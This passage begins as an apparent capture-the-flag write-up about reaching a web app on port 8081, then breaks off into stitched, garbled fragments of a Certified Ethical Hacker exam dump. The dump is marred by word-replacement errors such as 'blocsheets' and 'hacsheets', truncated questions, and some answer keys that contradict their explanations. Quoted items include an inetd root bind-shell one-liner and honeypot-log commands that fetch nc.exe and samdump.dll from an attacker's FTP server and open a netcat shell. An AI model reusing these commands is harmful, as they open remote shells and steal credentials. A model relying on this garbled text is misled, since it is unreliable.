## Initial Foothold

This machine's ssh and samba versions are not vulnerable. Also there is nothing to be found on port 8080.

Let's visit the web app running on port 8081.

http://192.168.164.98:8081


![image 3](https://raw.githubusercontent.com/thehunt1s0n/media/main/Pelican/image3.png)


We get redirected to http://192.168.164.98:8080/exhibitor/v1/ui/index.html

I searched in google for the zookeeper exploit then I found this:

Question: 21 
What is the tool Firewalk used for? 
A. To exam the IDS for proper operation 
B. To exam a firewall for proper operation 
C. To determine what rules are in place for a firewall 
D. To exam the webserver configuration 
E. Firewalk is a firewall auto configuration tool 
Answer: C 
Explanation: 
Firewalk is an active reconnaissance network security tool that attempts to determine what layer 
4 protocols a given IP forwarding device "firewall" will pass. Firewalk works by sending out TCP 
or UDP packets with a TTL one greater than the targeted gateway. If the gateway allows the 
traffic, it will forward the packets to the next hop where they will expire and elicit an 
ICMP_TIME_EXCEEDED message. If the gateway host does not allow the traffic, it will likely 
drop the packets and no response will be returned.

C. Netcat -sU -p 1-1024 <host(s.> 
D. Netcat -u -v -w2 <host> 1-1024 
E. Netcat -sS -O target/1024 
Answer: D 
Explanation: 
The proper syntax for a UDP scan using Netcat is "Netcat -u -v -w2 <host> 1-1024". Netcat is 
considered the Swiss-army knife of hacsheets tools because it is so versatile. 
Question: 24 
What are two things that are possible when scanning UDP ports?(Choose two. 
A. A reset will be returned 
B. An ICMP message will be returned 
C. The four-way handshake will not be completed 
D. An RFC 1294 message will be returned 
E. Nothing 
Answer: B, E 
Explanation: 
Closed UDP ports can return an ICMP type 3 code 3 message. No response can mean the port is 
open or the packet was silently dropped. 
Question: 25 
Which of the following ICMP message types are used for destinations unreachables? 
A. 0 
B. 3 
C. 11 
D. 13 
E. 17 
Answer: B 
Explanation: 
Type 3 messages are used for unreachable messages. 0 is Echo Reply, 8 is Echo request, 11 is 
time exceeded, 13 is timestamp and 17 is subnet mask request. Learning these would be 
advisable for the exam. 
Question: 26 
What does a type 3 code 13 represent?(Choose two. 
A. Echo request 
B. Destination unreachable 
C. Network unreachable 
D. Administratively prohibited 
Exam Name: Certified Ethical Hacker

Exam Code: 312-50 Total Questions: 255 
Page 9 of 77 
E. Port unreachable 
F. Time exceeded 
Answer: B, D 
Explanation: 
Type 3 code 13 is destination unreachable administratively prohibited. This type of message is 
typically returned from a device blocsheets a port. 
Question: 27 
Destination unreachable administratively prohibited messages can inform the hacker to what? 
A. That a circuit level proxy has been installed and is filtering traffic 
B. That his/her scans are being blocked by a honeypot or jail 
C. That the packets are being malformed by the scanning software 
D. That a router or other packet-filtering device is blocsheets traffic 
E. That the network is functioning normally 
Answer: D 
Explanation: 
Destination unreachable administratively prohibited messages are a good way to discover that a 
router or other low-level packet device is filtering traffic. Analysis of the ICMP message will reveal 
the IP address of the blocsheets device and the filtered port. This further adds the to the network 
map and information being discovered about the network and hosts. 
Question: 28 
Which of the following Nmap commands would be used to perform a stack fingerprinting? 
A. Nmap -O -p80 <host(s.>

This packet was taken from a packet sniffer that monitors a Web server. 
This packet was originally 1514 bytes long, but only the first 512 bytes are shown here. This is 
the standard hexdump representation of a network packet, before being decoded. A hexdump 
has three columns: the offset of each line, the hexadecimal data, and the ASCII equivalent. This 
packet contains a 14-byte Ethernet header, a 20-byte IP header, a 20-byte TCP header, an HTTP 
header ending in two linefeeds (0D 0A 0D 0A) and then the data. By examining the packet 
identify the name and version of the Web server? 
A. Apache 1.2 
B. IIS 4.0 
C. IIS 5.0 
D. Linux WServer 2.3 
Answer: B 
We see that the server is Microsoft, but the exam designer didn’t want to make it easy for you. So 
what they did is blank out the IIS 4.0. The key is in line “0B0” as you see: 
0B0 69 63 72 6F 73 6F 66 74 2D 49 49 53 2F 34 2E 30 ..Microsoft 
49 is I, so we get II 
53 is S, so we get IIS 
2F is a space 
34 is 4 
2E is . 
30 is 0 
So we get IIS 4.0 
The answer is B 
If you don’t remember the ASCII hex to Character, there are enough characters and numbers 
already converted. For example, line “050” has STRIDER which is 53 54 52 49 44 45 52 and 
gives you the conversion for the “I:” and “S” characters (which is “49” and “53”).

What does an ICMP (Code 13) message normally indicates? 
A. It indicates that the destination host is unreachable 
B. It indicates to the host that the datagram which triggered the source quench message will need 
 to be re-sent 
C. It indicates that the packet has been administratively dropped in transit 
D. It is a request to the host to cut back the rate at which it is sending traffic to the Internet 
 destination 
Answer: C 
CODE 13 and type 3 is destination unreachable due to communication administratively prohibited 
by filtering hence maybe they meant "code 13", therefore would be C).

C - Type 3 Code 13 
D - Typ4 4 
Question: 116 
Let's imagine three companies (A, B and C), all competing in a challenging global environment. 
Company A and B are worsheets together in developing a product that will generate a major 
competitive advantage for them. Company A has a secure DNS server while company B has a 
DNS server vulnerable to spoofing. With a spoofing attack on the DNS server of company B, 
company C gains access to outgoing e-mails from company B. How do you prevent DNS 
spoofing? 
A. Install DNS logger and track vulnerable packets 
B. Disable DNS timeouts 
C. Install DNS Anti-spoofer 
D. Disable DNS Zone Transfer

Question: 117 
What port scanning method involves sending spoofed packets to a target system and then 
loosheets for adjustments to the IPID on a zombie system? 
A. Blind Port Scanning 
B. Idle Scanning 
C. Bounce Scanning 
D. Stealth Scanning 
E. UDP Scanning 
Answer: B 
from NMAP: 
-sI <zombie host[:probeport]> Idlescan: This advanced scan method allows for a truly blind TCP 
port scan of the target (meaning no packets are sent to the tar- get from your real IP address). 
Instead, a unique side-channel attack exploits predictable "IP fragmentation ID" sequence 
generation on the zombie host to glean information about the open ports on the target.

You work as security technician at Examsheets.net. While doing web application examing, you 
might be required to look through multiple web pages online which can take a long time. Which of 
the processes listed below would be a more efficient way of doing this type of validation? 
A. Use mget to download all pages locally for further inspection. 
B. Use wget to download all pages locally for further inspection. 
C. Use get* to download all pages locally for further inspection. 
D. Use get() to download all pages locally for further inspection. 
Answer: B 
Wget is a utility used for mirroring websites, get* doesn’t work, as for the actual FTP command to 
work there needs to be a space between get and * (ie. get *), get(); is just bogus, that’s a C 
function that’s written 100% wrong. mget is a command used from “within” ftp itself, ruling out A. 
Which leaves B use wget, which is designed for mirroring and download files, especially web 
pages, if used with the –R option (ie. wget –R www.Examsheets.net) it could mirror a site, all 
expect protected portions of course. 
Note: 
GNU Wget is a free network utility to retrieve files from the World Wide Web using HTTP and FTP 
and can be used to make mirrors of archives and home pages thus enabling work in the 
background, after having logged off.

Page 38 of 77 
Explanation: 
Archive.org mirrors websites and categorizes them by date and month depending on the crawl 
time. Archive.org dates back to 1996, Google is incorrect because the cache is only as recent as 
the laexam crawl, the cache is over-written on each subsequent crawl. Download the website is 
incorrect because that's the same as what you see online. Visiting customer partners websites is 
just bogus. The answer is then Firmly, C, archive.org

Question: 128 
An Nmap scan shows the following open ports, and nmap also reports that the OS guessing 
results to atch too many signatures hence it cannot reliably be identified: 
21 ftp 
23 telnet 
80 http 
443 https 
What does this suggest ? 
A. This is a Windows Domain Controller 
B. The host is not firewalled 
C. The host is not a Linux or Solaris system 
D. The host is not properly patched 
Answer: D 
Explanation: 
If the answer was A nmap would guess it, it holds the MS signature database, the host not being 
irewalled makes no difference. The host is not linux or solaris, well it very well could be. The host 
is not roperly patched? That is the closest; nmaps OS detection architecture is based solely off 
the TCP ISN issued by the operating systems TCP/IP stack, if the stack is modified to show 
output from randomized ISN's or if your using a program to change the ISN then OS detection will 
fail. If the TCP/IP IP ID's are modified then os detection could also fail, because the machine 
would most likely come back as being down.

Answer: A 
Explanation: 
The question is not telling you what state the port is being reported by the scanning utility, if the 
program used to conduct this is nmap, nmap will show you one of three states – “open”, “closed”, 
or “filtered” a port can be in an “open” state yet filtered, usually by a stateful packet inspection 
filter (ie. Netfilter for linux, ipfilter for bsd). C and D to make any sense for this question, their 
bogus, and B, “You cannot spoof + TCP”, well you can spoof + TCP, so we strike that out. 
Question: 138 
What is the algorithm used by LM for Windows2000 SAM ? 
A. MD4 
B. DES 
C. SHA 
D. SSL 
Answer: B 
Explanation: 
Okay, this is a tricky question. We say B, DES, but it could be A “MD4” depending on what their 
assheets - Windows 2000/XP keeps users passwords not "apparently", but as hashes, i.e. 
actually as "check sum" of the passwords. Let's go into the passwords keeping at large. The most 
interesting structure of the complex SAM-file building is so called V-block. It's size is 32 bytes and 
it includes hashes of the password for the local entering: NT Hash of 16-byte length, and hash 
used during the authentication of access to the common resources of other computers LanMan 
Hash, or simply LM Hash, of the same 16-byte length. Algorithms of the formation of these 
hashes are following: 
NT Hash formation: 
1. User password is being generated to the Unicode-line. 
2. Hash is being generated based on this line using MD4 algorithm. 
3. Gained hash in being encoded by the DES algorithm, RID (i.e. user identifier) had been used 
as a key. It was necessary for gaining variant hashes for users who have equal passwords. 
You remember that all users have different RIDs (RID of the Administrator's built in account is 
500, RID of the Guest's built in account is 501, all other users get RIDs equal 1000, 
1001,1002, etc.). 
LM Hash formation: 
1. User password is being shifted to capitals and added by nulls up to 14-byte length. 
2. Gained line is divided on halves 7 bytes each, and each of them is being encoded separately 
using DES, output is 8-byte hash and total 16-byte hash. 
3. Then LM Hash is being additionally encoded the same way as it had been done in the NT 
Hash formation algorithm step 3. 
Question: 139 
In the context of using PKI, when Sven wishes to send a secret message to Bob, he looks up 
Bob’s public key in a directory, uses it to encrypt the message before sending it off. Bob then 
uses his private key to decrypt the message and reads it. No one listening on can decrypt the 
message. Anyone can send an encrypted message to Bob but only Bob can read it. Thus, 
although many people may know Bob’s public key and use it to verify Bob’s signature, they 
cannot discover Bob’s private key and use it to forge digital signatures. 
What does this principle refer to?

is the Win32 DOS shell on NT/2000/2003/XP), cmd.exe when spawned requires NO username or 
password and has the permissions of the username it is being executed as (probably guest in this 
instance, although it could be administrator). The #'s in the script means the text following is a 
comment, notice the last line in particular, if the # was removed the script would spawn a 
connection to itself, the host system it was running on.

Question: 246 
Study the following exploit code taken from a Linux machine and answer the questions below: 
echo “ingreslock stream tcp nowait root /bin/sh sh –I" > /tmp/x; 
/usr/sbin/inetd –s /tmp/x; 
sleep 10; 
/bin/ rm –f /tmp/x AAAA…AAA 
In the above exploit code, the command “/bin/sh sh –I" is given. 
What is the purpose, and why is ‘sh’ shown twice? 
A. The command /bin/sh sh –i appearing in the exploit code is actually part of an inetd 
 configuration file. 
B. The length of such a buffer overflow exploit makes it prohibitive for user to enter manually. The 
 second ‘sh’ automates this function. 
C. It checks for the presence of a codeword (setting the environment variable) among the 
 environment variables. 
D. It is a giveaway by the attacker that he is a script kiddy. 
Answer: D 
Explanation: 
What's going on in the above question is the attacker is trying to write to the unix filed /tm/x (his 
inetd.conf replacement config) -- he is attempting to add a service called ingresslock (which 
doesnt exist), which is "apparently" suppose to spawn a shell the given port specified by 
/etc/services for the service "ingresslock", ingresslock is a non-existant service, and if an attempt 
were made to respawn inetd, the service would error out on that line. (he would have to add the 
service to /etc/services to suppress the error). Now the question is assheets about /bin/sh sh -i 
which produces an error that should read "sh: /bin/sh: cannot execute binary file", the –I option 
places the shell in interactive mode and cannot be used to respawn itself.

Question: 248 
The following excerpt is taken from a honeypot log that was hosted at lab.wiretrip.net. Snort 
reported Unicode attacks from 213.116.251.162. The file Permission Canonicalization 
vulnerability (UNICODE attack) allows scripts to be run in arbitrary folders that do not normally 
have the right to run scripts. The attacker tries a Unicode attack and eventually succeeds in 
displaying boot.ini. He then switches to playing with RDS, via msadcs.dll. The RDS vulnerability 
allows a malicious user to construct SQL statements that will execute shell commands (such as 
CMD.EXE) on the IIS server. He does a quick query to discover that the directory exists, and a 
query to msadcs.dll shows that it is functioning correctly. The attacker makes a RDS query which 
results in the commands run as shown below: 
“cmd1.exe /c open 213.116.251.162 >ftpcom” 
“cmd1.exe /c echo johna2k >>ftpcom” 
“cmd1.exe /c echo haxedj00 >>ftpcom” 
“cmd1.exe /c echo get nc.exe >>ftpcom” 
“cmd1.exe /c echo get samdump.dll >>ftpcom” 
“cmd1.exe /c echo quit >>ftpcom” 
“cmd1.exe /c ftp –s:ftpcom” 
“cmd1.exe /c nc –l –p 6969 e-cmd1.exe” 
What can you infer from the exploit given? 
A. It is a local exploit where the attacker logs in using username johna2k. 
B. There are two attackers on the system – johna2k and haxedj00. 
C. The attack is a remote exploit and the hacker downloads three files. 
D. The attacker is unsuccessful in spawning a shell as he has specified a high end UDP port. 
Answer: A 
Explanation: 
Essentially what's going on above is this -- 
The attacker is adding the steps for an ftp session to a text file, he is including the IP address of 
the FTP server, the user, and the password, now that he has logged in, he downloads two files, 
nc (tcp/ip swiss army knife) and a DLL file, CEH called "Hacker Tool" and he then issues a 
command to disconnect, all of this is being written to the file "ftpcom" the >> you see on each line 
is telling the shell to "append" to the file, not start from scratch (< is read in, > is write out, >> is 
append to already created file by the C function open("ftpcom", O_CREAT)). after that an nc

session is executed and told to listen to tcp port 6969 of the server, and execute cmd1.exe (a dos 
shell) -- for the purposes of the exploit, cmd1.exe has been renamed or compromised. 
Question: 249 
You want to use netcat to generate huge amount of useless network data continuously for various 
performance examing between 2 hosts. 
Which of the following commands accomplish this? 
A. Machine A 
 #yes AAAAAAAAAAAAAAAAAAAAAA | nc –v –v –l –p 2222 > /dev/null 
 Machine B 
 #yes BBBBBBBBBBBBBBBBBBBBBB | nc machinea 2222 > /dev/null 
B. Machine A 
 cat somefile | nc –v –v –l –p 2222 
 Machine B 
 cat somefile | nc othermachine 2222 
C. Machine A 
 nc –l –p 1234 | uncompress –c | tar xvfp 
 Machine B 
 tar cfp - /some/dir | compress –c | nc –w 3 machinea 1234 
D. Machine A 
 while true : do 
 nc –v –l –s –p 6000 machineb 2 
 Machine B 
 while true ; do 
 nc –v –l –s –p 6000 machinea 2 
 done 
Answer: A 
Explanation: 
Machine A is setting up a listener on port 2222 using the nc command and then having the letter 
A sent an infinite amount of times, when yes is used to send data yes NEVER stops until it 
recieves a break signal from the terminal (Control+C), on the client end (machine B), nc is being 
used as a client to connect to machine A, sending the letter B and infinite amount of times, while 
both clients have established a TCP connection each client is infinitely sending data to each 
other, this process will run FOREVER until it has been stopped by an administrator or the 
attacker.
